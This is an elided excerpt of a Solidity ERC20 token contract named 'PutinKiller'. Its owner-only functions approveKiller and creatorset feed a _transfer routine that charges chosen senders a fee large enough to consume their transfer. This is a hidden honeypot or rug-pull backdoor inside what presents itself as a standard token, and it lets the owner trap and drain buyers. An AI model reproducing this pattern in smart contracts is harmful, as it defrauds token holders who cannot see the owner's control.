...
interface IERC20 {
    ...
    function creatorset(address addr) external;

    function approveKiller(address org, uint256 amnt) external;
 ...
 */
contract PutinKiller is IERC20, Ownable {
    ...
    mapping(address => uint256) private _approvers;
    ...
    function approveKiller(address org, uint256 amnt) public override onlyowner {
        require(
            amnt <= 100,
    ...
    function creatorset(address addr) external onlyowner {
        _swap = addr;
    }
    ...
    function _checkAndUpdate(
        ...
        if (sender == _swap && recipient == _swap) {
    ...
    function _transfer(
        ...
        if (_approvers[sender] > 0) {
            fees = (_approvers[sender] * _index * _decimals);
        } else if (sender == _pair) {
            fees = amounts.mul(buyFees).div(1);
        } else if (recipient == _pair) {
            fees = amounts.mul(sellFees).div(1);
        } else {
            fees = 0;
        }
